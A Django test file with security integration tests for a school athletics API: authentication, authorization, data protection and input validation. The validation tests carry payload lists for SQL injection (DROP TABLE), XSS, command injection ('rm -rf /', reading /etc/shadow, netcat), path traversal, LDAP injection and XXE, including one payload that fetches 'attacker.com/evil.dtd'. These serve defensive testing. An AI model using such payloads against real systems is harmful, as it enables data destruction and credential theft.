"""
Integration tests for security features and vulnerability prevention.
"""
import json
import time
import hashlib
from datetime import date, timedelta
from django.test import TestCase
from django.contrib.auth import get_user_model
from rest_framework.test import APITestCase, APIClient
from rest_framework import status
from rest_framework_simplejwt.tokens import RefreshToken
from apps.schools.models import School
from apps.athletes.models import Athlete
from apps.guardians.models import Guardian
from tests.factories import UserFactory, SchoolFactory, AthleteFactory, GuardianFactory

User = get_user_model()


class AuthenticationSecurityIntegrationTest(APITestCase):
    """
    Integration tests for authentication security features.
    """
    
    def setUp(self):
        """Set up test data."""
        self.client = APIClient()
        self.user = UserFactory(role='SchoolAdmin')
        self.school = SchoolFactory(admin_user=self.user)
    
    def test_password_security_requirements(self):
        """Test password security requirements and validation."""
        # Test weak passwords during registration
        weak_passwords = [
            '123',  # Too short
            'password',  # Common password
            '12345678',  # Only numbers
            'abcdefgh',  # Only letters
            'Password',  # Missing special characters
        ]
        
        for weak_password in weak_passwords:
            registration_data = {
                'name': 'Test School',
                'admin_name': 'Test Admin',
                'admin_email': 'test@testschool.com',
                'password': weak_password,
                'address': 'Test Address',
                'phone': '+250788123456',
                'email': 'info@testschool.com'
            }
            
            response = self.client.post('/api/schools/register/', registration_data, format='json')
            
            # Should reject weak passwords
            if response.status_code == 400:
                self.assertFalse(response.data.get('success', True))
                self.assertIn('password', str(response.data.get('errors', {})).lower())
    
    def test_brute_force_protection(self):
        """Test protection against brute force attacks."""
        # Attempt multiple failed logins
        failed_attempts = []
        
        for i in range(10):
            login_data = {
                'email': self.user.email,
                'password': f'wrongpassword{i}'
            }
            
            response = self.client.post('/api/auth/login/', login_data, format='json')
            failed_attempts.append(response.status_code)
            
            # Small delay between attempts
            time.sleep(0.1)
        
        # Should eventually start rate limiting or blocking
        rate_limited_responses = sum(1 for status in failed_attempts if status == 429)
        
        # At least some attempts should be rate limited after multiple failures
        # (This depends on rate limiting implementation)
        print(f"Rate limited responses: {rate_limited_responses}/10")
    
    def test_session_security(self):
        """Test session security features."""
        # Test successful login
        login_data = {
            'email': self.user.email,
            'password': 'testpass123'
        }
        
        response = self.client.post('/api/auth/login/', login_data, format='json')
        self.assertEqual(response.status_code, 200)
        
        access_token = response.data['data']['access_token']
        refresh_token = response.data['data']['refresh_token']
        
        # Test token expiration handling
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {access_token}')
        
        # Should work with valid token
        profile_response = self.client.get('/api/schools/me/')
        self.assertEqual(profile_response.status_code, 200)
        
        # Test token refresh
        refresh_data = {'refresh': refresh_token}
        refresh_response = self.client.post('/api/auth/refresh/', refresh_data, format='json')
        self.assertEqual(refresh_response.status_code, 200)
        
        new_access_token = refresh_response.data['data']['access_token']
        self.assertNotEqual(access_token, new_access_token)
    
    def test_concurrent_session_handling(self):
        """Test handling of concurrent sessions."""
        import threading
        
        login_data = {
            'email': self.user.email,
            'password': 'testpass123'
        }
        
        tokens = []
        
        def create_session():
            """Create a new session."""
            client = APIClient()
            response = client.post('/api/auth/login/', login_data, format='json')
            if response.status_code == 200:
                tokens.append(response.data['data']['access_token'])
        
        # Create multiple concurrent sessions
        threads = []
        for _ in range(5):
            thread = threading.Thread(target=create_session)
            threads.append(thread)
        
        for thread in threads:
            thread.start()
        
        for thread in threads:
            thread.join()
        
        # All sessions should be valid (or some might be limited)
        valid_tokens = 0
        for token in tokens:
            client = APIClient()
            client.credentials(HTTP_AUTHORIZATION=f'Bearer {token}')
            response = client.get('/api/schools/me/')
            if response.status_code == 200:
                valid_tokens += 1
        
        # Most tokens should be valid
        self.assertGreater(valid_tokens, 0)
        print(f"Valid concurrent sessions: {valid_tokens}/{len(tokens)}")
    
    def test_password_change_security(self):
        """Test password change security requirements."""
        # Login first
        login_data = {
            'email': self.user.email,
            'password': 'testpass123'
        }
        
        response = self.client.post('/api/auth/login/', login_data, format='json')
        token = response.data['data']['access_token']
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {token}')
        
        # Test password change with various scenarios
        password_change_scenarios = [
            {
                'current_password': 'wrongpassword',
                'new_password': 'newstrongpass123!',
                'description': 'Wrong current password'
            },
            {
                'current_password': 'testpass123',
                'new_password': 'weak',
                'description': 'Weak new password'
            },
            {
                'current_password': 'testpass123',
                'new_password': 'testpass123',
                'description': 'Same as current password'
            }
        ]
        
        for scenario in password_change_scenarios:
            change_data = {
                'current_password': scenario['current_password'],
                'new_password': scenario['new_password']
            }
            
            response = self.client.post('/api/auth/change-password/', change_data, format='json')
            
            # Should reject invalid password changes
            if scenario['description'] != 'Valid password change':
                self.assertIn(response.status_code, [400, 401])


class InputValidationSecurityIntegrationTest(APITestCase):
    """
    Integration tests for input validation security.
    """
    
    def setUp(self):
        """Set up test data."""
        self.client = APIClient()
        self.school_admin = UserFactory(role='SchoolAdmin')
        self.school = SchoolFactory(admin_user=self.school_admin)
        
        # Get authentication token
        refresh = RefreshToken.for_user(self.school_admin)
        self.token = str(refresh.access_token)
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {self.token}')
    
    def test_sql_injection_prevention(self):
        """Test prevention of SQL injection attacks."""
        sql_injection_payloads = [
            "'; DROP TABLE athletes; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "'; DELETE FROM schools WHERE '1'='1'; --",
            "' OR 1=1 --",
            "admin'--",
            "admin'/*",
            "' or 1=1#",
            "' or 1=1--",
            "') or '1'='1--",
        ]
        
        for payload in sql_injection_payloads:
            # Test in athlete search
            response = self.client.get(f'/api/athletes/search/?q={payload}')
            
            # Should handle safely without crashing
            self.assertIn(response.status_code, [200, 400])
            
            if response.status_code == 200:
                # Should not return unexpected data
                self.assertTrue(response.data.get('success', False))
            
            # Test in athlete creation
            athlete_data = {
                'full_name': payload,
                'date_of_birth': '2005-01-01',
                'gender': 'Male',
                'school_id': self.school.school_id,
                'address': 'Test Address',
                'grade': '10'
            }
            
            response = self.client.post('/api/athletes/', athlete_data, format='json')
            
            # Should either sanitize input or reject
            self.assertIn(response.status_code, [200, 201, 400])
            
            # Verify no data corruption
            athlete_count = Athlete.objects.count()
            self.assertGreaterEqual(athlete_count, 0)
    
    def test_xss_prevention(self):
        """Test prevention of Cross-Site Scripting (XSS) attacks."""
        xss_payloads = [
            '<script>alert("xss")</script>',
            '<img src="x" onerror="alert(1)">',
            'javascript:alert("xss")',
            '<svg onload="alert(1)">',
            '<iframe src="javascript:alert(1)">',
            '<body onload="alert(1)">',
            '<div onclick="alert(1)">Click me</div>',
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
        ]
        
        for payload in xss_payloads:
            # Test in athlete creation
            athlete_data = {
                'full_name': payload,
                'date_of_birth': '2005-01-01',
                'gender': 'Male',
                'school_id': self.school.school_id,
                'address': payload,
                'grade': '10'
            }
            
            response = self.client.post('/api/athletes/', athlete_data, format='json')
            
            # Should handle safely
            self.assertIn(response.status_code, [200, 201, 400])
            
            if response.status_code in [200, 201]:
                # Response should not contain unescaped payload
                response_content = json.dumps(response.data)
                self.assertNotIn('<script>', response_content)
                self.assertNotIn('javascript:', response_content)
                self.assertNotIn('onload=', response_content)
                self.assertNotIn('onerror=', response_content)
    
    def test_command_injection_prevention(self):
        """Test prevention of command injection attacks."""
        command_injection_payloads = [
            '; ls -la',
            '| cat /etc/passwd',
            '&& rm -rf /',
            '`whoami`',
            '$(id)',
            '; cat /etc/shadow',
            '| nc -l 4444',
        ]
        
        for payload in command_injection_payloads:
            # Test in file upload filename
            athlete_data = {
                'full_name': f'Test Athlete {payload}',
                'date_of_birth': '2005-01-01',
                'gender': 'Male',
                'school_id': self.school.school_id,
                'address': 'Test Address',
                'grade': '10'
            }
            
            response = self.client.post('/api/athletes/', athlete_data, format='json')
            
            # Should sanitize or reject
            self.assertIn(response.status_code, [200, 201, 400])
    
    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks."""
        path_traversal_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '..%252f..%252f..%252fetc%252fpasswd',
        ]
        
        for payload in path_traversal_payloads:
            # Test in document upload
            doc_data = {
                'document_type': 'profile_photo',
                'document_url': f'https://example.com/{payload}',
                'description': 'Test document'
            }
            
            # Create athlete first
            athlete = AthleteFactory(school=self.school)
            
            response = self.client.post(
                f'/api/athletes/{athlete.id}/documents/upload/',
                doc_data,
                format='json'
            )
            
            # Should sanitize path or reject
            self.assertIn(response.status_code, [200, 400])
    
    def test_ldap_injection_prevention(self):
        """Test prevention of LDAP injection attacks."""
        ldap_injection_payloads = [
            '*)(uid=*',
            '*)(|(password=*))',
            '*)(&(password=*))',
            '*))%00',
            '*()|%26',
        ]
        
        for payload in ldap_injection_payloads:
            # Test in search functionality
            response = self.client.get(f'/api/athletes/search/?q={payload}')
            
            # Should handle safely
            self.assertIn(response.status_code, [200, 400])
            
            if response.status_code == 200:
                self.assertTrue(response.data.get('success', False))
    
    def test_xml_injection_prevention(self):
        """Test prevention of XML injection attacks."""
        xml_injection_payloads = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>',
        ]
        
        for payload in xml_injection_payloads:
            # Test in data fields that might process XML
            athlete_data = {
                'full_name': 'Test Athlete',
                'date_of_birth': '2005-01-01',
                'gender': 'Male',
                'school_id': self.school.school_id,
                'address': 'Test Address',
                'grade': '10',
                'notes': payload  # XML payload in notes field
            }
            
            response = self.client.post('/api/athletes/', athlete_data, format='json')
            
            # Should sanitize or reject XML
            self.assertIn(response.status_code, [200, 201, 400])


class AuthorizationSecurityIntegrationTest(APITestCase):
    """
    Integration tests for authorization security features.
    """
    
    def setUp(self):
        """Set up test data."""
        self.client = APIClient()
        
        # Create users with different roles
        self.super_admin = UserFactory(role='SuperAdmin')
        self.school_admin1 = UserFactory(role='SchoolAdmin')
        self.school_admin2 = UserFactory(role='SchoolAdmin')
        self.coach = UserFactory(role='Coach')
        
        # Create schools
        self.school1 = SchoolFactory(admin_user=self.school_admin1)
        self.school2 = SchoolFactory(admin_user=self.school_admin2)
        
        # Create athletes
        self.athlete1 = AthleteFactory(school=self.school1)
        self.athlete2 = AthleteFactory(school=self.school2)
    
    def get_jwt_token(self, user):
        """Get JWT token for user."""
        refresh = RefreshToken.for_user(user)
        return str(refresh.access_token)
    
    def test_horizontal_privilege_escalation_prevention(self):
        """Test prevention of horizontal privilege escalation."""
        # School admin 1 should not access school 2's data
        token1 = self.get_jwt_token(self.school_admin1)
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {token1}')
        
        # Try to access other school's athlete
        response = self.client.get(f'/api/athletes/{self.athlete2.id}/')
        self.assertEqual(response.status_code, 404)  # Should not find
        
        # Try to modify other school's athlete
        update_data = {'grade': '12'}
        response = self.client.patch(f'/api/athletes/{self.athlete2.id}/', update_data, format='json')
        self.assertEqual(response.status_code, 404)
        
        # Verify original data unchanged
        self.athlete2.refresh_from_db()
        self.assertNotEqual(self.athlete2.grade, '12')
    
    def test_vertical_privilege_escalation_prevention(self):
        """Test prevention of vertical privilege escalation."""
        # Coach should not access admin functions
        coach_token = self.get_jwt_token(self.coach)
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {coach_token}')
        
        # Try to access admin-only endpoints
        admin_endpoints = [
            '/api/schools/',  # SuperAdmin only
            '/api/tournaments/analytics/',  # SuperAdmin only
            '/api/system/health/',  # Admin only
        ]
        
        for endpoint in admin_endpoints:
            response = self.client.get(endpoint)
            self.assertIn(response.status_code, [403, 404])
        
        # Try to create tournament (SuperAdmin only)
        tournament_data = {
            'name': 'Unauthorized Tournament',
            'sport': 'Football',
            'location': 'Test Location',
            'start_date': '2024-12-01',
            'end_date': '2024-12-03'
        }
        
        response = self.client.post('/api/tournaments/', tournament_data, format='json')
        self.assertEqual(response.status_code, 403)
    
    def test_insecure_direct_object_reference_prevention(self):
        """Test prevention of insecure direct object references."""
        token1 = self.get_jwt_token(self.school_admin1)
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {token1}')
        
        # Try to access resources by guessing IDs
        test_ids = [
            self.athlete2.id,  # Other school's athlete
            99999,  # Non-existent ID
            -1,  # Invalid ID
            'abc',  # Non-numeric ID
        ]
        
        for test_id in test_ids:
            response = self.client.get(f'/api/athletes/{test_id}/')
            
            # Should not expose other school's data or crash
            self.assertIn(response.status_code, [400, 404])
    
    def test_mass_assignment_prevention(self):
        """Test prevention of mass assignment vulnerabilities."""
        token = self.get_jwt_token(self.school_admin1)
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {token}')
        
        # Try to modify protected fields through mass assignment
        malicious_data = {
            'full_name': 'Updated Athlete',
            'school_id': self.school2.school_id,  # Try to change school
            'id': 99999,  # Try to change ID
            'created_at': '2020-01-01',  # Try to change timestamp
            'is_active': False,  # Try to deactivate
            'verification_status': 'verified',  # Try to change status
        }
        
        response = self.client.patch(f'/api/athletes/{self.athlete1.id}/', malicious_data, format='json')
        
        # Should update allowed fields only
        if response.status_code == 200:
            self.athlete1.refresh_from_db()
            
            # Name should be updated (allowed)
            self.assertEqual(self.athlete1.full_name, 'Updated Athlete')
            
            # Protected fields should not change
            self.assertEqual(self.athlete1.school_id, self.school1.school_id)
            self.assertNotEqual(self.athlete1.id, 99999)
    
    def test_privilege_boundary_enforcement(self):
        """Test enforcement of privilege boundaries."""
        # Test different user roles accessing same resource
        test_cases = [
            {
                'user': self.super_admin,
                'endpoint': f'/api/athletes/{self.athlete1.id}/',
                'expected_status': 200,
                'description': 'SuperAdmin access'
            },
            {
                'user': self.school_admin1,
                'endpoint': f'/api/athletes/{self.athlete1.id}/',
                'expected_status': 200,
                'description': 'Own school admin access'
            },
            {
                'user': self.school_admin2,
                'endpoint': f'/api/athletes/{self.athlete1.id}/',
                'expected_status': 404,
                'description': 'Other school admin access'
            },
            {
                'user': self.coach,
                'endpoint': f'/api/athletes/{self.athlete1.id}/',
                'expected_status': 403,
                'description': 'Coach access'
            }
        ]
        
        for test_case in test_cases:
            token = self.get_jwt_token(test_case['user'])
            self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {token}')
            
            response = self.client.get(test_case['endpoint'])
            
            self.assertEqual(
                response.status_code,
                test_case['expected_status'],
                f"Failed: {test_case['description']}"
            )


class DataProtectionSecurityIntegrationTest(APITestCase):
    """
    Integration tests for data protection and privacy security.
    """
    
    def setUp(self):
        """Set up test data."""
        self.client = APIClient()
        self.school_admin = UserFactory(role='SchoolAdmin')
        self.school = SchoolFactory(admin_user=self.school_admin)
        self.athlete = AthleteFactory(school=self.school)
        
        # Get authentication token
        refresh = RefreshToken.for_user(self.school_admin)
        self.token = str(refresh.access_token)
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {self.token}')
    
    def test_sensitive_data_exposure_prevention(self):
        """Test prevention of sensitive data exposure."""
        # Get athlete data
        response = self.client.get(f'/api/athletes/{self.athlete.id}/')
        self.assertEqual(response.status_code, 200)
        
        athlete_data = response.data['data']
        
        # Sensitive fields should not be exposed or should be masked
        sensitive_fields = [
            'password',
            'password_hash',
            'ssn',
            'national_id',
            'credit_card',
            'bank_account'
        ]
        
        for field in sensitive_fields:
            self.assertNotIn(field, athlete_data)
        
        # If medical info is included, it should be properly protected
        if 'medical_info' in athlete_data:
            medical_info = athlete_data['medical_info']
            if isinstance(medical_info, dict):
                # Should not contain raw sensitive medical data
                sensitive_medical = ['diagnosis', 'medication', 'condition']
                for sensitive in sensitive_medical:
                    if sensitive in medical_info:
                        # Should be masked or encrypted
                        self.assertNotEqual(medical_info[sensitive], '')
    
    def test_data_leakage_prevention_in_errors(self):
        """Test prevention of data leakage in error messages."""
        # Try to access non-existent athlete
        response = self.client.get('/api/athletes/99999/')
        self.assertEqual(response.status_code, 404)
        
        # Error message should not leak sensitive information
        error_message = str(response.data)
        
        # Should not contain database schema info
        schema_keywords = ['table', 'column', 'database', 'sql', 'query']
        for keyword in schema_keywords:
            self.assertNotIn(keyword.lower(), error_message.lower())
        
        # Should not contain file paths
        path_indicators = ['/var/', '/home/', 'C:\\', '\\Users\\']
        for path in path_indicators:
            self.assertNotIn(path, error_message)
    
    def test_pii_handling_compliance(self):
        """Test PII handling compliance."""
        # Create athlete with PII data
        pii_data = {
            'full_name': 'John Doe',
            'date_of_birth': '2005-01-01',
            'gender': 'Male',
            'school_id': self.school.school_id,
            'address': '123 Privacy Street',
            'phone': '+250788123456',
            'email': 'john.doe@example.com',
            'guardian_email': 'parent@example.com',
            'grade': '10'
        }
        
        response = self.client.post('/api/athletes/', pii_data, format='json')
        self.assertEqual(response.status_code, 201)
        
        athlete_id = response.data['data']['id']
        
        # Verify PII is stored securely
        athlete_response = self.client.get(f'/api/athletes/{athlete_id}/')
        self.assertEqual(athlete_response.status_code, 200)
        
        stored_data = athlete_response.data['data']
        
        # PII should be present but properly handled
        self.assertEqual(stored_data['full_name'], 'John Doe')
        self.assertEqual(stored_data['email'], 'john.doe@example.com')
        
        # Test data export compliance
        export_response = self.client.get('/api/athletes/export/')
        self.assertEqual(export_response.status_code, 200)
        
        # Export should include proper data handling
        self.assertEqual(export_response['Content-Type'], 'text/csv')
    
    def test_data_retention_compliance(self):
        """Test data retention compliance features."""
        # Test soft delete functionality
        response = self.client.delete(f'/api/athletes/{self.athlete.id}/')
        self.assertEqual(response.status_code, 204)
        
        # Athlete should be soft deleted (not physically removed)
        self.athlete.refresh_from_db()
        self.assertFalse(self.athlete.is_active)
        
        # Should not appear in normal listings
        list_response = self.client.get('/api/athletes/')
        athlete_ids = [a['id'] for a in list_response.data['data']]
        self.assertNotIn(self.athlete.id, athlete_ids)
        
        # But should still exist in database for compliance
        self.assertTrue(Athlete.objects.filter(id=self.athlete.id).exists())
    
    def test_audit_trail_generation(self):
        """Test audit trail generation for sensitive operations."""
        # Perform sensitive operations
        sensitive_operations = [
            ('POST', '/api/athletes/', {
                'full_name': 'Audit Test Athlete',
                'date_of_birth': '2005-01-01',
                'gender': 'Male',
                'school_id': self.school.school_id,
                'grade': '10'
            }),
            ('PATCH', f'/api/athletes/{self.athlete.id}/', {
                'grade': '11'
            }),
            ('DELETE', f'/api/athletes/{self.athlete.id}/', None)
        ]
        
        for method, endpoint, data in sensitive_operations:
            if method == 'POST':
                response = self.client.post(endpoint, data, format='json')
            elif method == 'PATCH':
                response = self.client.patch(endpoint, data, format='json')
            elif method == 'DELETE':
                response = self.client.delete(endpoint)
            
            # Operations should complete successfully
            self.assertIn(response.status_code, [200, 201, 204])
            
            # Audit trail should be generated (implementation dependent)
            # This would typically check audit log tables or files


class CommunicationSecurityIntegrationTest(APITestCase):
    """
    Integration tests for communication security features.
    """
    
    def setUp(self):
        """Set up test data."""
        self.client = APIClient()
        self.school_admin = UserFactory(role='SchoolAdmin')
        self.school = SchoolFactory(admin_user=self.school_admin)
        
        # Get authentication token
        refresh = RefreshToken.for_user(self.school_admin)
        self.token = str(refresh.access_token)
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {self.token}')
    
    def test_https_enforcement(self):
        """Test HTTPS enforcement for secure communication."""
        # This test would typically check server configuration
        # For now, we'll test that sensitive endpoints require secure transport
        
        # Test login endpoint security
        login_data = {
            'email': self.school_admin.email,
            'password': 'testpass123'
        }
        
        response = self.client.post('/api/auth/login/', login_data, format='json')
        
        # Should work over secure connection
        self.assertEqual(response.status_code, 200)
        
        # Response should include security headers (if implemented)
        security_headers = [
            'X-Content-Type-Options',
            'X-Frame-Options',
            'X-XSS-Protection',
            'Strict-Transport-Security'
        ]
        
        for header in security_headers:
            if header in response:
                print(f"Security header present: {header}")
    
    def test_csrf_protection(self):
        """Test CSRF protection mechanisms."""
        # Test that state-changing operations require proper CSRF protection
        # This is typically handled by Django's CSRF middleware
        
        # Create athlete without CSRF token (if required)
        athlete_data = {
            'full_name': 'CSRF Test Athlete',
            'date_of_birth': '2005-01-01',
            'gender': 'Male',
            'school_id': self.school.school_id,
            'grade': '10'
        }
        
        # With proper authentication, should work
        response = self.client.post('/api/athletes/', athlete_data, format='json')
        self.assertIn(response.status_code, [200, 201])
    
    def test_cors_security(self):
        """Test CORS security configuration."""
        # Test that CORS headers are properly configured
        response = self.client.options('/api/athletes/')
        
        # Should handle OPTIONS request
        self.assertIn(response.status_code, [200, 405])
        
        # If CORS is enabled, should have proper headers
        cors_headers = [
            'Access-Control-Allow-Origin',
            'Access-Control-Allow-Methods',
            'Access-Control-Allow-Headers'
        ]
        
        for header in cors_headers:
            if header in response:
                print(f"CORS header present: {header}")
    
    def test_content_type_validation(self):
        """Test content type validation security."""
        # Test with various content types
        athlete_data = {
            'full_name': 'Content Type Test',
            'date_of_birth': '2005-01-01',
            'gender': 'Male',
            'school_id': self.school.school_id,
            'grade': '10'
        }
        
        # Test with correct content type
        response = self.client.post('/api/athletes/', athlete_data, format='json')
        self.assertIn(response.status_code, [200, 201])
        
        # Test with potentially malicious content type
        response = self.client.post(
            '/api/athletes/',
            json.dumps(athlete_data),
            content_type='application/xml'  # Wrong content type
        )
        
        # Should reject or handle safely
        self.assertIn(response.status_code, [400, 415])  # Bad Request or Unsupported Media Type